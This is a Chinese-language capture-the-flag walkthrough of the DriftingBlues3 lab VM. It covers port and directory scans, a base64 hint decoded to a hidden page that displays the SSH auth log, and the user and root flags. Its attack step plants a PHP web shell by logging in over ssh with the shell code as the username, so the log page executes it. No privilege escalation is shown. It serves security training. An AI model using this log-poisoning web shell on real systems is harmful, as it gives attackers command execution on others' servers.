# Driftingblues3

:::note

[Linux VM] [Tested on VirtualBox] created by || tasiyanci

⏲️ Release Date // 2021-01-08

✔️ MD5 // 4414608b527abba0a2893af3c2fd4cfd

☠ Root // 128

💀 User // 127

📝Notes //
Tested on and exported from virtualbox.

:::

## 靶机启动

![靶机启动](img/image_20231252-185237.png)

靶机 IP：

```plaintext
192.168.56.116
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.116
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:25:7C:BA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 探测 web 服务

尝试直接访问

![访问 /](img/image_20231206-190640.png)

进行目录扫描

```plaintext
[19:05:30] 200 -   11B  - /MANIFEST.MF
[19:05:30] 200 -   11B  - /Makefile
[19:05:37] 301 -  317B  - /drupal  ->  http://192.168.56.116/drupal/
[19:05:38] 200 -    1KB - /index.html
[19:05:41] 301 -  321B  - /phpmyadmin  ->  http://192.168.56.116/phpmyadmin/
[19:05:41] 200 -  268B  - /phpmyadmin/
[19:05:41] 301 -  318B  - /privacy  ->  http://192.168.56.116/privacy/
[19:05:42] 200 -   37B  - /robots.txt
[19:05:42] 301 -  317B  - /secret  ->  http://192.168.56.116/secret/
[19:05:42] 200 -   90B  - /secret/
[19:05:44] 200 -  947B  - /wp-admin/
[19:05:44] 301 -  319B  - /wp-admin  ->  http://192.168.56.116/wp-admin/
```

### `/wp-admin`

路径下没有数据

![/wp-admin](img/image_20231208-190835.png)

### `/secret`

没有有价值的信息

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.116/secret/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 25
Content-Type: text/html
Date: Fri, 29 Dec 2023 11:09:21 GMT
ETag: "5a-5b812950a2c8b-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 04 Jan 2021 12:53:52 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### `/privacy`

也是一样的，没有有价值信息

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.116/privacy/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 26
Content-Type: text/html
Date: Fri, 29 Dec 2023 11:10:13 GMT
ETag: "b3-5b81296166a5e-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 04 Jan 2021 12:54:10 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

ABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABAB
```

### `/robots.txt`

得到

```plaintext
User-agent: *
Disallow: /eventadmins
```

## 探测 `/eventadmins`

尝试访问

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.116/eventadmins/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 209
Content-Type: text/html
Date: Fri, 29 Dec 2023 11:12:23 GMT
ETag: "11d-5b811ce188721-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 04 Jan 2021 11:58:15 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<body>
<p>man there's a problem with ssh</p>
<p>john said "it's poisonous!!! stay away!!!"</p>
<p>idk if he's mentally challenged</p>
<p>please find and fix it</p>
<p>also check /littlequeenofspades.html</p>
<p>your buddy, buddyG</p>
</body>
</html>
```

得到一个路径： `/littlequeenofspades.html`

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.116/littlequeenofspades.html
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 544
Content-Type: text/html
Date: Fri, 29 Dec 2023 11:14:13 GMT
ETag: "522-5b811c7f17c00-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 04 Jan 2021 11:56:32 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<body>
<p>Now, she is a little queen of spades, and the men will not let her be                                </p>
<p>Mmmm, she is the little queen of spades, and the men will not let her be             </p>
<p>Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       </p>
<p>I'm gon' get me a gamblin' woman, if the last thing that I do                        </p>
<p>Eee, gon'get me a gamblin' woman, if it's the last thing that I do                  </p>
<p>Well, a man don't need a woman, ooh fair brown, that he got to give all his money to </p>
<p>Everybody say she got a mojo, now she's been usin' that stuff                        </p>
<p>Mmmm, mmmm, 'verybody says she got a mojo,'cause she been usin' that stuff          </p>
<p>But she got a way trimmin'down, hoo fair brown, and I mean it's most too tough      </p>
<p>Now, little girl, since I am the king, baby, and you is a queen                      </p>
<p>Ooo eee, since I am the king baby, and you is a queen                                </p>
<p>Le's us put our heads together, hoo fair brown, then we can make our money green     </p>
<p style="color:white">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p>
</html>
```

对其中的 base64 编码进行分析

```plaintext
aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==

--> intruder? L2FkbWluc2ZpeGl0LnBocA==

--> /adminsfixit.php
```

## 探测 `/adminsfixit.php`

尝试访问

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.116/adminsfixit.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 949
Content-Type: text/html; charset=UTF-8
Date: Fri, 29 Dec 2023 11:20:19 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<body>
<p>#######################################################################</p>
<p>ssh auth log</p>
<p>============</p>
<p>i hope some wacky and uncharacteristic thing would not happen</p>
<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>
<p>-abuzer komurcu</p>
<p>#######################################################################</p>
<p> </p>
<p> </p>
</html>
Dec 29 04:51:01 driftingblues CRON[751]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 29 04:51:01 driftingblues CRON[751]: pam_unix(cron:session): session closed for user root
Dec 29 04:52:01 driftingblues CRON[755]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 29 04:52:01 driftingblues CRON[755]: pam_unix(cron:session): session closed for user root
Dec 29 04:53:01 driftingblues CRON[759]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 29 04:53:01 driftingblues CRON[759]: pam_unix(cron:session): session closed for user root
Dec 29 04:53:14 driftingblues sshd[763]: Did not receive identification string from 192.168.56.102 port 45318
Dec 29 04:53:21 driftingblues sshd[764]: Protocol major versions differ for 192.168.56.102 port 34908: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-Nmap-SSH1-Hostkey
Dec 29 04:53:21 driftingblues sshd[765]: Protocol major versions differ for 192.168.56.102 port 34918: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-NmapNSE_1.0
Dec 29 04:53:22 driftingblues sshd[766]: Unable to negotiate with 192.168.56.102 port 34934: no matching host key type found. Their offer: ssh-dss [preauth]
Dec 29 04:53:22 driftingblues sshd[768]: Connection closed by 192.168.56.102 port 34940 [preauth]
Dec 29 04:53:22 driftingblues sshd[770]: Connection closed by 192.168.56.102 port 34952 [preauth]
Dec 29 04:53:22 driftingblues sshd[772]: Unable to negotiate with 192.168.56.102 port 34962: no matching host key type found. Their offer: ecdsa-sha2-nistp384 [preauth]Dec 29 04:53:22 driftingblues sshd[774]: Unable to negotiate with 192.168.56.102 port 34978: no matching host key type found. Their offer: ecdsa-sha2-nistp521 [preauth]Dec 29 04:53:22 driftingblues sshd[776]: Connection closed by 192.168.56.102 port 34992 [preauth]
Dec 29 04:54:01 driftingblues CRON[778]: pam_unix(cron:session): session opened for user root by (uid=0)
Dec 29 04:54:01 driftingblues CRON[778]: pam_unix(cron:session): session closed for user root
Dec 29 04:55:01 driftingblues CRON[787]: pam_unix(cron:session): session opened for user root by (uid=0)
......
```

可以发现其为 SSH 的日志数据，可以尝试将 webshell 输入进 SSH 日志中，从而实现 web 服务种马

```bash
┌─[✗]─[randark@randark-Parrot]─[~]
└──╼ $ssh '<?php system($_POST[“cmd”]);?>'@192.168.56.116
<?php system($_POST[\342\200\234cmd\342\200\235]);?>@192.168.56.116: Permission denied (publickey).
```

然后就会发现访问 `/adminsfixit.php` 不会返回数据了，其实就是种下的 webshell 被解析了，尝试使用蚁剑进行连接

:::warning

种马时注意自己的 payload，否则会面临入口点直接崩掉

（我的靶机已经没救了）

:::

## user pwned

```plaintext title="/home/robertj/user.txt"
413fc08db21285b1f8abea99040b0280
```

## root pwned

```plaintext title="/root/root.txt"
dfb7f604a22928afba370d819b35ec83
```
